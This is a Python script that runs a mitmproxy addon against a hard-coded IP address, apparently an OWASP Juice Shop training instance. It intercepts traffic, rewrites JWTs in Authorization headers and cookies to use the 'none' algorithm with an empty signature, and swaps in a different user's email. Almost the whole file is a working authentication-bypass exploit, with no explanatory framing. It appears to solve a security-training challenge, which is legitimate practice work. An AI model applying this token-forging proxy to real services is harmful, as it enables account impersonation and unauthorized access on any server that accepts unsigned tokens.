import json
import base64
import re
import asyncio
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from mitmproxy import http, options
from mitmproxy.tools.dump import DumpMaster

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8080

JUICE_URL_SNIPPET = "45.76.47.218:3000"

RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
-----END RSA PUBLIC KEY-----"""

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data: str) -> bytes:
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

def forge_jwt(original_token: str) -> str:
    try:
        # Split token
        header_b64, payload_b64, _ = original_token.split(".")
        header = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))

        # Modify header to use 'none' algorithm
        header["alg"] = "none"
        
        # Modify payload
        payload["data"]["email"] = "jwtn3d@juice-sh.op"
        payload["data"].pop("deletedAt", None)

        # Re-encode header and payload
        new_header_b64 = b64url_encode(json.dumps(header).encode())
        new_payload_b64 = b64url_encode(json.dumps(payload).encode())

        # Empty signature for 'none' algorithm
        forged_token = f"{new_header_b64}.{new_payload_b64}."

        return forged_token
    except Exception as e:
        print(f"[!] Error forging token: {e}")
        return original_token
class InterceptJWT:
    def request(self, flow: http.HTTPFlow):
        if JUICE_URL_SNIPPET not in flow.request.pretty_url:
            return

        # 1) Header Authorization
        auth_header = flow.request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            original_token = auth_header.removeprefix("Bearer ").strip()
            try:
                forged = forge_jwt(original_token)
                flow.request.headers["Authorization"] = f"Bearer {forged}"
                print("[*] Authorization: RSA-lord token injected!")
            except Exception as e:
                print("[!] Error forging Authorization:", e)

        # 2) Cookie token
        cookie = flow.request.headers.get("cookie", "")
        if "token=" in cookie:
            match = re.search(r"token=([^;]+)", cookie)
            if match:
                cookie_token = match.group(1)
                try:
                    forged = forge_jwt(cookie_token)
                    new_cookie = re.sub(r"token=[^;]+", f"token={forged}", cookie)
                    flow.request.headers["cookie"] = new_cookie
                    print("[*] Cookie: RSA-lord token injected!")
                except Exception as e:
                    print("[!] Error forging cookie token:", e)

async def run_proxy():
    opts = options.Options(listen_host=LISTEN_HOST, listen_port=LISTEN_PORT)
    m = DumpMaster(opts)
    m.addons.add(InterceptJWT())

    try:
        await m.run()
    except KeyboardInterrupt:
        print("[!] Proxy interrupted.")
    finally:
        m.shutdown()

def unsignedJWT():
    asyncio.run(run_proxy())


# def main():
#     asyncio.run(run_proxy())

# if __name__ == "__main__":
#     main()